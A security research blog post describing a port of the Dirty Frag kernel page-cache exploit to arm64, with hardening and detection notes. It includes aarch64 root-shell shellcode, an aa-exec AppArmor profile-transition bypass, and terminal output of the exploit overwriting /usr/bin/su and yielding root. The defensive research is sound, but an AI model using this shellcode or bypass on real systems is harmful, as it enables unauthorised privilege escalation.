---
date: '2026-05-11T00:00:00Z'
title: "Porting Dirty Frag to arm64: Detection, Prevention and Hardening Notes"
summary: "Porting CVE-2026-43284 exploit to aarch64. The rxrpc path kernel oopses on arm64. Ubuntu 24.04's AppArmor blocked exploitation over SSH, transitioning into existing complain-mode profile leads to success. Analysis of chmod o-r as a mitigation for SUID targets, FIM limitations, and page-cache persistence."
tags: ["Dirty Frag", "CVE-2026-43284", "AppArmor", "Purple Team", "Detection Engineering", "Kernel Security", "arm64", "aarch64", "Page Cache", "CVE-2026-43500", "Tetragon", "Exploit"]
categories: ["Security Research"]
---

## Intro

Hyunwoo Kim ([@v4bel](https://github.com/V4bel)) researched and discovered Dirty Frag (CVE-2026-43284, CVE-2026-43500) and publicly disclosed on 5/7/26. The PoC that was released along with it is for x86_64 systems. I run several x86_64 systems but most of my servers are aarch64 on AWS Graviton. At the time of my test on Ubuntu 24.04 AWS arm64, 6.17.0-1013-aws was the latest available kernel in my environment and did not contain the relevant Copy Fail or Dirty Frag fixes.

This port was made to learn what it takes to port the public PoC to arm64 and whether my own machines were vulnerable. They were, but only through specific access paths, and understanding why turned out 
to be the most interesting finding. Direct exploitation from a normal SSH shell was blocked by Ubuntu's AppArmor unprivileged-userns restriction, but the same path became exploitable after transitioning 
into an existing complain-mode AppArmor profile.

### Source on GitHub

The arm64 port is available at [github.com/linnemanlabs/dirtyfrag-arm64](https://github.com/linnemanlabs/dirtyfrag-arm64). Tetragon detection policies, YARA rules, and any other detection work I do will be there soon.

### Notes

This post reflects my testing window. For live systems, distinguish between upstream/mainline fixes, distribution backports, and temporary mitigations such as module blocking or namespace restrictions.

This post is not in any way a replacement for V4bel’s original write-up. It focuses on what changed during my aarch64 port, what I observed on Ubuntu AWS arm64 kernels, and what defenders can detect or harden around.

## Quick Dirty Frag Background

V4bel has a [full write-up](https://github.com/V4bel/dirtyfrag/blob/master/assets/write-up.md) with the details of the vulnerability and the chain. This is another attack that ultimately poisons the page cache similar to `Dirty Pipe` and the recent `Copy Fail`. The recurring pattern is that a kernel path receives page-cache-backed data through splice/vmsplice-style plumbing, later treats those pages as privately mutable, and ends up modifying the cached contents of a file the attacker could only read.

## Findings

### AppArmor userns restrictions

On my Ubuntu 24.04.4 LTS test system, a normal SSH session reports as unconfined, but Ubuntu’s AppArmor unprivileged-user-namespace restriction still prevents the exploit from completing UID mapping inside the new namespace. The failure happens at the uid_map write, which prevents the process from becoming root inside the namespace and gaining the namespaced capabilities needed for the ESP/XFRM path.

The sysctl setting `kernel.apparmor_restrict_unprivileged_userns=1`  is responsible for this.

A user logged in via SSH:

```bash
ubuntu@devbox:~$ cat /proc/sys/kernel/apparmor_restrict_unprivileged_userns
1
ubuntu@devbox:~$ cat /proc/sys/kernel/apparmor_restrict_unprivileged_unconfined
0
ubuntu@devbox:~$ cat /proc/self/attr/apparmor/current
unconfined
ubuntu@devbox:~$ ./dirtyfrag_arm64 --force-esp
[su] uid_map: Operation not permitted
[su] corruption stage failed (status=0x100)
dirtyfrag: failed (rc=1)
```

However, the configuration on the image I tested leaves the sysctl `kernel.apparmor_restrict_unprivileged_unconfined=0`.

As the same user logged in via SSH:

``` bash
ubuntu@devbox:~$ aa-exec -p runc -- env DIRTYFRAG_VERBOSE=1 /tmp/dirtyfrag_arm64 --force-esp
[su] installed 53 xfrm SAs
[su] wrote 212 bytes to /usr/bin/su starting at 0x0
[su] /usr/bin/su page-cache patched (entry 0x78 = shellcode)
# cat /proc/self/attr/apparmor/current
runc//null-/tmp/dirtyfrag_arm64//null-/usr/bin/su//null-/usr/bin/dash//null-/usr/bin/cat (complain)
# id
uid=0(root) gid=0(root) groups=0(root)
```

The relevant hardening knob is:

``` bash
sudo sysctl -w kernel.apparmor_restrict_unprivileged_unconfined=1
```

This is not a kernel fix for Dirty Frag. It closes the aa-exec/profile-transition bypass class that allowed my unconfined SSH shell to enter a more permissive profile and recover the namespace capability path.

Re-running the exploit is back to the original failure:

```bash
ubuntu@jump-bastion-2b-065c5b:~/dirtyfrag-arm64/test$ aa-exec -p runc -- env DIRTYFRAG_VERBOSE=1 /tmp/dirtyfrag_arm64 --force-esp
[su] uid_map: Operation not permitted
[su] corruption stage failed (status=0x100)
dirtyfrag: failed (rc=1)
```

On servers, I would consider enabling kernel.apparmor_restrict_unprivileged_unconfined=1 after (lots of) testing. It closes the aa-exec profile-transition bypass class I used here, and Ubuntu recommends it as an additional hardening step for releases where it is not already enabled. There is probably better existing documentation on this at other sites than I can provide here.

### AWS SSM

SSM was the first place I noticed the pattern. I spent a full day thinking Ubuntu was vulnerable because I was doing all my work over SSM using a less restrictive AppArmor profile. In my tests, it inherited the snap SSM Agent AppArmor profile:

```
$ cat /proc/self/attr/apparmor/current
snap.amazon-ssm-agent.amazon-ssm-agent (complain)
```

If you run SSM do not assume Ubuntu’s AppArmor userns hardening applies equally to every access path. Check the actual AppArmor label for your session with `/proc/self/attr/apparmor/current`.

This is less impactful for privilege escalation if SSM sessions already have sudo access, the user can get root anyway. This does allow for silent poisoning of the page cache which will cause any number of downstream effects depending on what files they overwrite, and in a very difficult-to-attribute way, which is its own concern.

It matters more in environments that use restricted SSM sessions (non-root RunAs, no sudo) or that rely on AppArmor enforcement for other security boundaries. The complain-mode profile on the SSM snap applies to all AppArmor policy, not just namespace restrictions.

### flush_dcache_page crash on the rxrpc route

On x86\_64, `flush_dcache_page()` is a no-op. x86 has hardware-coherent data/instruction caches. On arm64, it performs real dcache maintenance and dereferences the `struct page*` metadata. When the rxrpc crypto path (`rxkad_secure_packet` -> `crypto_pcbc_encrypt` -> `skcipher_walk_done`) calls `flush_dcache_page` on a page whose reference has been manipulated through the splice/vmsplice chain, x86\_64 silently skips it but arm64 hits a translation fault and oopses:

```
pc : flush_dcache_page+0x18/0x58
lr : skcipher_walk_done+0xbc/0x260
     crypto_pcbc_encrypt+0xe8/0x1c8 [pcbc]
     crypto_skcipher_encrypt+0x48/0xb8
     rxkad_secure_packet+0x108/0x270 [rxrpc]
     rxrpc_send_data+0x264/0x550 [rxrpc]
```

On the arm64 systems I tested, denying the `uid_map` write removed the working ESP path. The namespace may still be created, but the process cannot map itself to root inside it or gain the namespaced capabilities needed for XFRM setup. The rxrpc fallback did not provide a working namespace-free privilege-escalation path on arm64, it oopsed the kernel instead. On x86\_64 the rxrpc path provides a namespace-free alternative.

## What Actually Changes for arm64

The trigger mechanisms - XFRM SA setup, splice/vmsplice/pipe chain, ESP decrypt-in-place, the rxrpc/rxkad handshake, and all the netlink plumbing are architecture-neutral C. It compiles and runs identically on aarch64. The entire port came down to four data changes and zero logic changes.

On arm64, only the ESP path was viable in my testing. This path requires creating a user and network namespace and then successfully mapping the calling user to root inside that namespace. On the Ubuntu 24.04 LTS image I tested, AppArmor’s unprivileged-userns restriction blocked the direct SSH path by blocking unprivileged UID mapping inside the new namespace, not by preventing namespace creation outright.

On x86_64, the rxrpc path provides a fallback that works without the ESP path's namespace setup. On arm64, that fallback did not produce a working privilege-escalation path in my testing, it oopsed the kernel instead. That left ESP as the viable route, and the direct SSH path failed when AppArmor denied the `uid_map` write needed to gain namespaced capabilities.

### aarch64 Shellcode ELF Payload

The shellcode is for x86_64 and had to be replaced. This is simple minimal code functionally identical to what the upstream PoC is doing:

```
setgid(0); setuid(0); setgroups(0, NULL);
execve("/bin/sh", NULL, ["TERM=xterm", NULL]);
```

This is the upstream x86_64:

```
mov al, 0x6a              ; setgid
syscall

mov al, 0x69              ; setuid
syscall

mov al, 0x74              ; setgroups
syscall

push 0                    ; envp[1] = NULL
lea rax, [rip+0x12]       ; rax = "TERM=xterm"

push rax                  ; envp[0]
mov rdx, rsp              ; rdx = envp

lea rdi, [rip+0x12]       ; rdi = "/bin/sh"
xor esi, esi              ; rsi = NULL (argv)
push 0x3b ; pop rax       ; rax = 59 (execve)
syscall                   ; execve("/bin/sh",NULL,envp)

"TERM=xterm\0"
"/bin/sh\0"
```

This is our aarch64:

```
mov     x0, #0
mov     x8, #144        ; setgid
svc     #0

mov     x0, #0
mov     x8, #146        ; setuid
svc     #0

mov     x0, #0
mov     x1, #0
mov     x8, #159        ; setgroups
svc     #0

adr     x3, term_str
mov     x4, #0
stp     x3, x4, [sp, #-16]!
mov     x2, sp          ; x2 = envp = ["TERM=xterm", NULL]

adr     x0, binsh
mov     x1, #0
mov     x8, #221
svc     #0              ; execve("/bin/sh", NULL, envp)

term_str:
  .asciz  "TERM=xterm"
binsh:
  .asciz  "/bin/sh"
```

The payload is slightly larger so we loop additional times to cover the larger range. We have to modify a couple functions that are checking if the page cache has successfully been overwritten that are looking for the x86_64 shellcode also.

## Proactive Hardening: Beyond the Kernel Patch

This is the third vulnerability in the past few years in a similar class of writing to read-only cache pages. There are several steps that are worth implementing for a more defensive posture.

### AppArmor / SELinux

One of the biggest protections is disabling unprivileged user namespace creation, or limiting what operations they can perform.

On my Ubuntu 24.04.4 LTS test system, the AppArmor configuration (`apparmor_restrict_unprivileged_userns=1`) blocks the exploit by preventing uid_map writes inside user namespaces. The namespace is created but the process can't map its UID to 0 inside it, so it can't obtain CAP_NET_ADMIN, and XFRM SA creation fails.

In my testing, the direct SSH path was blocked even though the process reported as `unconfined`. However, with `kernel.apparmor_restrict_unprivileged_unconfined=0`, that protection was bypassable by transitioning into an existing complain-mode profile with `aa-exec`. After setting `kernel.apparmor_restrict_unprivileged_unconfined=1`, the same profile-transition path failed at the original `uid_map` write.

Note that `aa-exec` is the normal AppArmor tool for launching a command under a selected profile and it is not SUID.

### Kernel Modules

If you are not using ESP or AFS you can safely disable all of the modules involved in this vulnerability:

- esp4
- esp6
- rxrpc
- ipcomp4
- ipcomp6

In general, it's worth auditing exactly which kernel modules you need and unloading and blacklisting all of the rest. That still leaves many modules that the kernel will load on-demand, which is the case for esp4/esp6 which are loaded when creating an AF_RXRPC socket or when the xfrm framework calls request_module().

The real fix is to restrict to your required module set (or compile into kernel), and prevent all module loading either entirely or after boot. You can do this with sysctl `kernel.modules_disabled` or by using kernel lockdown mode.

### Setuid binaries

This exploit works in part because it is overwriting an SUID binary. The file permission metadata and the file contents are checked and loaded through separate paths. The kernel checks the SUID bit on the inode, then loads the binary content from page cache. The exploit modifies the content without touching the metadata.

The attack can target any readable file, which leaves a number of paths to privilege escalation only limited by imagination - config files, shared libraries, scripts that run as root by cron, etc. But SUID binaries are the easiest and simplest targets.

It is good practice to be familiar with the SUID binaries on your system and what users/groups can read/execute them, and what other creative paths lead to privilege escalation from an 'arbitrary file content edit' class vulnerability like this. Those are the same attack surfaces that are frequently going to be targets regardless of the specific path the latest vulnerability opens up.

Audit your system's current SUID binaries with:
```bash
find / -type f -xdev -perm -4000 -ls 2>/dev/null
```

### Filesystem Hardening

Using read-only filesystems or something like dm-verity won't prevent the page cache corruption. Its value is reducing persistence and making replacement/reboot return the node to a known-good image. So for an ephemeral node with a short life span, the poisoned cache page may persist until a reboot (or successful cache eviction) which is as long as the node will live anyway. For me that means I may as well replace the node with a new one with a patched kernel vs rebooting one that ever had a vulnerable kernel.

For a workstation or a longer-lived node, there are significant gains to dm-verity in preventing persistence post-exploitation, but that is an entire post of its own and unrelated.

### Read permissions

This class of vulnerability relies on the user having read permissions for the file they want to poison the page cache for. splice()/vmsplice() never get the page cache to poison otherwise. If you remove read permissions from the SUID binary, the exploit fails:

First as root:

```bash
chmod o-r /usr/bin/su
root@devbox:~# chmod 4711 /usr/bin/su
root@devbox:~# ls -al /usr/bin/su
-rws--x--x 1 root root 67744 Mar  6 11:00 /usr/bin/su
```

As unprivileged user:

```bash
ubuntu@devbox:~$ strace ./dirtyfrag-arm64 --force-esp
execve("./dirtyfrag-arm64", ["./dirtyfrag-arm64", "--force-esp"], 0xfffff0798e58 /* 19 vars */) = 0
...
openat(AT_FDCWD, "/usr/bin/su", O_RDONLY) = -1 EACCES (Permission denied)
openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 4
pread64(4, "root:x:0:0:root:", 16, 0)   = 16
close(4)                                = 0
dup3(3, 2, 0)                           = 2
close(3)                                = 0
write(2, "dirtyfrag: failed (rc=1)\n", 25dirtyfrag: failed (rc=1)
) = 25
exit_group(1)                           = ?
+++ exited with 1 +++
```

Users do not need read permission to execute a binary, but removing read permission from SUID binaries should still be tested against backup, EDR, package verification, debugging, operational tooling/scripts, etc.

This can apply to a lot of the other paths as well - scripts executed by cron as root, config files, etc. Read permissions cannot be removed from shared libraries, the dynamic loader opens them within the process. Which means an attacker could still overwrite shared libraries as a path to privilege escalation. A little more work to get right than replacing some shellcode in an SUID binary though.

### File Integrity Monitoring

Most FIM tools operating in a 'real-time' mode will actually not get triggered by this, as they are working at the VFS layer or higher. inotify/fanotify fires on VFS operations like write(), rename(), unlink(), etc. The inode's mtime/ctime/size/etc are all unchanged so no event is generated.

auditd with rules watching for syscalls like open() (with O-WRONLY / O_RDWR) or write() or chmod() will not see anything. They can see the exploit opening the file with O-RDONLY if you are watching SUID binaries, etc.

Tools that do periodic hashing of filesystem contents could detect this. AIDE, wazuh with scheduled syscheck, Tripwire on cron (does anyone else still run that?), etc read from the page cache when they do their scans. The problem is, they will only detect the modification during the window the modification is in place. If the attacker runs the exploit, does their post-exploitation work, then drops caches before the periodic hashing runs, then the scan is going to run against the normal non-corrupted page cache and get the normal expected hash.

A competent attacker can make that window extremely small with a little work which makes periodic hashing an impractical detection method. However, an attacker that doesn't clean up after themselves will leave a detection window that lasts until the next reboot.

## Conclusion

tl;dr:

- The arm64 port required payload/data changes, not exploit logic changes.
- The rxrpc path kernel oopsed on arm64 in my testing, leaving the ESP path as the viable route.
- Direct ESP exploitation from a normal unconfined SSH shell was blocked by Ubuntu 24.04's AppArmor unprivileged-userns restriction.
- That block was bypassable on my tested image by transitioning into an existing complain-mode AppArmor profile with `aa-exec` while `kernel.apparmor_restrict_unprivileged_unconfined=0`.
- Setting `kernel.apparmor_restrict_unprivileged_unconfined=1` blocked the profile-transition path in my testing.
- SSM was not special it was just one access path that already started inside a complain-mode snap AppArmor profile.
- Removing read permissions from SUID binaries (`chmod o-r`) blocks this splice-based page-cache attack class against those SUID binary targets.
- Event-based FIM is blind to this page-cache modification. Periodic hashing can detect it only during the contamination window.

The usual baseline hardening advice still applies - blacklist unused kernel modules, restrict namespace creation, audit SUID binaries, use read-only filesystems where possible, limit filesystem permissions to least privilege, etc.

---

*Source available at [github.com/linnemanlabs/dirtyfrag-arm64](https://github.com/linnemanlabs/dirtyfrag-arm64)*